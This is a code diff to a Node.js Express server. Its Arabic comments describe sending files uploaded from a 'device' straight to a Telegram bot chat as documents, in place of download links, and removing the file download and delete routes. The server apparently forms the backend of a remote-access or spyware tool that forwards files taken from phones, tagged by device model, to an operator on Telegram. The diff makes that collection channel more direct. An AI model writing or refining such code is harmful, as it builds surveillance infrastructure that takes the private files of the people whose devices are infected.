@@ -60,34 +60,9 @@ app.get('/', (req, res) => {
     res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙮</h1>');
 });
 
-app.get('/getFile/*', (req, res) => {
-    const requestedName = req.params[0];
-    const files = fs.readdirSync('uploadedFile');
-    const matchedFile = files.find(f => f === requestedName);
-    if (!matchedFile) {
-        return res.status(404).send('<h1>File not found</h1>');
-    }
-    const filePath = path.join(__dirname, 'uploadedFile', matchedFile);
-    res.sendFile(filePath);
-});
-
-app.get('/deleteFile/*', (req, res) => {
-    const requestedName = req.params[0];
-    const files = fs.readdirSync('uploadedFile');
-    const matchedFile = files.find(f => f === requestedName);
-    if (!matchedFile) {
-        return res.send(`<h1>"${requestedName}" does not exist</h1>`);
-    }
-    const filePath = path.join(__dirname, 'uploadedFile', matchedFile);
-    fs.unlink(filePath, (err) => {
-        if (err) {
-            res.send(`<h1>Error deleting file: ${err.message}</h1>`);
-        } else {
-            res.send(`<h1>The file was deleted successfully</h1>`);
-        }
-    });
-});
-
+// ================================================
+// تعديل مسار رفع الملفات: إرسال الملف مباشرة إلى التليجرام بدلاً من رابط
+// ================================================
 app.post('/uploadFile', upload.single('file'), (req, res) => {
     const originalName = req.file.originalname;
     const tempPath = req.file.path;
@@ -99,18 +74,25 @@ app.post('/uploadFile', upload.single('file'), (req, res) => {
             console.error('Error renaming file:', err);
             return res.status(500).send('');
         }
-        const host_url = req.protocol + '://' + req.get('host');
-        appBot.sendMessage(
+
+        // إرسال الملف كـ document إلى التليجرام
+        appBot.sendDocument(
             id,
-            `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` +
-                `𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ${originalName}\n` +
-                `𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ${host_url}/getFile/${safeName}\n` +
-                `𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ${host_url}/deleteFile/${safeName}`,
-            { parse_mode: 'HTML', disable_web_page_preview: true }
-        );
+            finalPath,
+            {
+                caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
+                parse_mode: 'HTML'
+            }
+        ).catch(e => console.error('Telegram send error:', e));
+
         res.send('');
     });
 });
+
+// ================================================
+// إزالة مسارات getFile و deleteFile لأننا لم نعد نحتاجها
+// (يمكنك إبقاؤها إذا أردت ولكن لن تُستخدم)
+// ================================================
 
 app.post('/uploadText', (req, res) => {
     appBot.sendMessage(
